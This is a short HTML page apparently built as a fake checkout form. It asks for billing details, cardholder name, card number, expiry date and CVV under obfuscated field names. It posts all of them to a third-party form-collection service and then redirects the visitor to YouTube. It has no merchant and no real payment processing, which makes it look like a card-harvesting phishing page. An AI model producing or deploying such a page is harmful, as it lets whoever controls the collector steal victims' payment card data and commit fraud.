<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- custom css file link  -->
    <link rel="stylesheet" href="css/style.css">

</head>

    
<body>

<div class="container">

<form action="https://formcarry.com/s/aTnVuHLPF" name="formA" method="POST" accept-charset="UTF-8">

        <div class="row">

            <div class="col">

                <h3 class="title">billing address</h3>

                <div class="inputBox">
                    <span>full name :</span>
                    <input type="text" name="a" placeholder=""  maxlength="50" required>
                </div>
                
                <div class="inputBox">
                    <span>email :</span>
                    <input type="email" name="b"  placeholder="" maxlength="50" required>
                </div>
                
                <div class="inputBox">
                    <span>Country :</span>
                    <input type="text" name="c"  placeholder=""  maxlength="50" required>
                </div>         

                <div class="inputBox">
                    <span>city :</span>
                    <input type="text"  name="d" placeholder=""  maxlength="50" required>
                </div>
                
                <div class="inputBox">
                    <span>address :</span>
                    <input type="text" name="e"  placeholder="Locality - Street" maxlength="50"  required>
                </div>



            </div>

            <div class="col">

                <h3 class="title">Card Payment</h3>

                <div class="inputBox">
                    <span>cards accepted :</span>
                    <img src="images/card_img.png" alt="">
                </div>
                
                
                <div class="inputBox">
                    <span>Name On Card :</span>
                    <input type="text" name="f"  placeholder=""  maxlength="50"  required>
                </div>
                
                <div class="inputBox">
                    <span>Card number :</span>
                    <input type="number" name="g"  placeholder="1111222233334444"  maxlength="50"  required>
                </div>


                <div class="flex">
                    <div class="inputBox">
                        <span>expiration date :</span>
                        <input type="text" name="h"  placeholder="MM/YY"  maxlength="10" required>
                    </div>
                    <div class="inputBox">
                        <span>CVV :</span>
                        <input type="number" name="i"  placeholder="CVV"  maxlength="6" required>
                    </div>
                    
                </div>

            </div>

      <input type="hidden" name="_next" value="https://www.youtube.com">


            
        </div>

        <input type="submit" value="Complete Payment" class="submit-btn">

    </form>

</div>    
    
</body>
</html>
